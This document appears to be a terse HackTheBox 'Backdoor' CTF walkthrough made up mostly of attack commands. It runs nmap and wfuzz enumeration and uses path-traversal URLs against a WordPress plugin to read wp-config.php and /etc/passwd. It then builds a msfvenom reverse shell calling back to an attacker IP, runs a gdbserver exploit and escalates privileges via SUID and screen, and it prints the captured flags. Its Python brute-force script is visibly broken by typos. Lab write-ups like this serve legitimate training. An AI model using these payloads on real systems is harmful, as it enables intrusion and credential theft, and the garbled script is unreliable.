# Maquina-Backdoor-htb-
Backdoor htb 

nmap -p- --open -T5 -v -n 10.10.11.125 -oN allports
nmap -sCV -p22,80,1337 10.10.11.125 -oN analysis
whatweb 10.10.11.125
wfuzz -c --hc=404 -L -t 300 /home/kali/.zsh_history/fasttrack.txt -w http://backdoor.htb/ /FUZZ.php
searchsploit WordPres
wpscan --url http://backdoor.htb enumerate p,u -- plugins-detection aggressive 

searchsploit WordPress ebook
searchsploit -p 39575
cat /usr/share/exploitdb/exploits/php/webapps/39575.txt

http://backdoor.htb//wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
http://backdoor.htb//wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../etc/password

nano sploit.py
#!/bin/python3

import signal 
import requests
import sys

from pwn import * 
def def_handler(sig,frame):
print("\[!] Stoping the program...\n")
sys.exit(1)


signal.signal(signal.SIGINT,def_handler)

#gGlobal Variables

url = "http:backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc"
error_resp =123 
p1 = log.progres("bute force:")
p1.status("Starting Brute force attack")

for pid in range(0,3000):
	p1.status("Testing pid %d" % (pid))
	cont = (request.get(url + srt(pid) + "/cmdline")).content
	if (len (contect) > error_resp):
		print(f"[+] process (pid) found")
print(content)
print("------------------------------------------\n")

python3 sploit.py

searchsploit gdbserver
searchsploit -p 50539

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.8 LPORT=9090 PrependFork=true -o rev.bin

sudo nc -lvnp 9090

python3 /usr/share/exploitdb/exploits/linux/remote/50539.py 10.10.11.125:1337 rev.bin


whoami
hostname -I
script dev null -c bash
stty raw -echo; fg
reset 
xterm
export TERM=term
export SHELL=bash
clear
bandera de usuario 
cat user.txt
7b92f75ea3c89f02030d537958da235d


find / -perm -u=s -type f 2>/dev/null

screen -x root/root
whoami
ls
659af1a89722fcd0c5fad6c67ea3fccf
